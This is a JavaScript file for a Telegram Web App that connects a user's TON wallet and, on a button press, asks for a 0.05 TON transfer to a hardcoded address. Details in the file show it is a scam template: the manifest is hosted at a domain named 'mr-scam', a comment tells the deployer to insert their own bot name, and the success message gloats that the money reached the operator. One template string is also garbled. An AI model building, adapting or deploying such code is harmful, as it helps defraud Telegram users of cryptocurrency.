const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

const usernameEl = document.getElementById('username');
let username = 'Guest';
if (tg.initDataUnsafe?.user) {
  const user = tg.initDataUnsafe.user;
  username = user.username ? `@${user.username}` : user.first_name || 'User';
}
usernameEl.textContent = username;

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
  buttonRootId: 'connect-container',
  actionsConfiguration: {
    twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на юзернейм своего бота!
  }
});

let connectedWallet = null;
tonConnectUI.onStatusChange(wallet => {
  const walletStatusEl = document.getElementById('wallet-status');
  if (wallet) {
    connectedWallet = wallet.account.address;
    // 100% чистый текст — шаблонная строка интерполируется правильно
    walletStatusEl.textContent = `Кошелёк подключён: \( {connectedWallet.slice(0,8)}... \){connectedWallet.slice(-6)}`;
    document.getElementById('payment-section').style.display = 'block';
  } else {
    connectedWallet = null;
    walletStatusEl.textContent = 'Кошелёк: не подключён';
    document.getElementById('payment-section').style.display = 'none';
  }
});

document.getElementById('payment-btn').onclick = async () => {
  if (!connectedWallet) {
    alert('⚠️ Подключите кошелёк сначала!');
    return;
  }

  const transaction = {
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [{
      address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ',
      amount: '50000000' // 0.05 TON
    }]
  };

  try {
    await tonConnectUI.sendTransaction(transaction);
    alert('✅ 0.05 TON успешно внесено! Деньги пришли тебе 😈');
  } catch (e) {
    alert('❌ Ошибка или отменено');
  }
};
